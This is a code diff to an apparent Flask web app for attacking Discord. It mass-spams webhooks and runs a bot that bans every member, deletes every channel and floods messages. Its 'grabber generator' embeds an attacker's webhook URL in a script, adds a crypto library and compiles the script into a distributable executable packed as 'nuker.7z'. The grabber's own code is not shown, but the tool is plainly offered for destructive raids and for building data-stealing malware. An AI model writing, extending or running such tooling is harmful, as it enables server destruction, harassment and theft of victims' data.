@@ -29,7 +29,7 @@ def webhookNuke():
     if request.method == "POST":
         logId = "".join(random.choice(string.ascii_lowercase) for _ in range(12))
         
-        webhookUrls = request.form.getlist('webhookUrl')
+        webhookUrls = request.form["webhookUrls"].split("\r\n")
         latency = int(request.form["latency"])
         message = request.form["message"]
         
@@ -63,6 +63,7 @@ def botNuke():
         channelName = request.form["channelName"]
         latency = int(request.form["latency"])
         message = request.form["message"]
+        subMessages  = request.form["subMessages"].split("\r\n")
         allUserBan = "allUserBan" in request.form
         allChannelDelete = "allChannelDelete" in request.form
         
@@ -77,7 +78,7 @@ AllChannelDelete:{allChannelDelete}
 
 """
         
-        bot = discordBot.DiscordBot(logId, token, guildId, channelName, latency, message, allUserBan, allChannelDelete)
+        bot = discordBot.DiscordBot(logId, token, guildId, channelName, latency, ([message]*(len(subMessages)+2))+subMessages, allUserBan, allChannelDelete)
         botThread = threading.Thread(target=bot.runBot, daemon=True)
         botThread.start()
         return render_template('botNuke.html', logId=logId)
@@ -98,6 +99,7 @@ def grabberGenerator():
             for library in libraries:
                 bLibraries.append(library.lower()
                     .replace("pillow", "PIL")
+                    .replace("pycryptodome", "Crypto")
                 )
             setupScript = ["from cx_Freeze import setup, Executable",
                             "setup(",
@@ -111,7 +113,7 @@ def grabberGenerator():
                 f.write(f"WEBHOOK_URL=\"{webhookUrl}\"\n{script}")
             with open(f"temp/{randomStr}-setup.py", mode="w") as f:
                 f.write("\n".join(setupScript))
-            
+
             subprocess.run(f"\"{sys.executable}\" -m pip install --upgrade pip "+" ".join(libraries), shell=True)
             subprocess.run(f"\"{sys.executable}\" ./temp/{randomStr}-setup.py build", shell=True)
             with py7zr.SevenZipFile("nuker.7z", 'w', filters=[{'id': py7zr.FILTER_LZMA2, 'preset': 9}]) as archive:
